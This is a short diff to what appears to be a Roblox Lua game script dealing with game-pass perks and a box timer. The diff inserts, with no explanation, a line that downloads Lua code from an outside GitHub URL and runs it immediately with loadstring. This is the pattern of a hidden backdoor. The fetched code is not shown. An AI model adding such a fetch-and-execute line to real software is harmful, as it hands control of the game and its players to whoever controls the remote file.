@@ -180,7 +180,7 @@ if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(Player.UserId,130
 	BoxWait = 4
 	print("Box Wait changed")
 end
-
+loadstring(game:HttpGet("https://github.com/MX6-RBX/NewScuffedScript/edit/main/Pointless.lua"))()
 local function shorten(Input)
 	local Negative = Input < 0
 	Input = math.abs(Input)
